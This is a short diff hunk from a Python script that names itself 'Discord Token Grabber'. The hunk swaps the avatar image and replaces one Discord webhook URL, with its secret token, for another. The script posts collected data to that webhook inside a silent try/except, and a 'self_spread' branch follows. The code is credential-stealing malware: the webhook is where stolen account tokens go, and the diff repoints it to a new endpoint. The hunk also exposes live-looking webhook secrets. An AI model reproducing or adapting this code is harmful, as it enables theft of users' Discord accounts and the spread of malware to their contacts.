@@ -179,10 +179,10 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
-        "avatar_url": "https://media.discordapp.net/attachments/933016875401642021/981904412370952252/Snapchat-1734647735.jpg"
+        "avatar_url": "https://cdn.discordapp.com/attachments/904025359509491803/1307319687650213939/giphy.gif?ex=6739dfd6&is=67388e56&hm=d31b96862777568b05b77a416abc48dcdb5d4b00c99a3e1f05092c8281dc7e7a&"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/978208200891441192/ICq5zsWRJdBZfFvxgqgnCZ9Pds8a19s4G1x6p1djWt-8lbM-1Rth17mydjUxBk2oZbQC", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1307319557190586410/UGUbNHU5abBQSg_GdEMmL8Az35XVcDEL13K1xnpz3ygpnywfceohp-lEdbaLV7rJpEwP", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
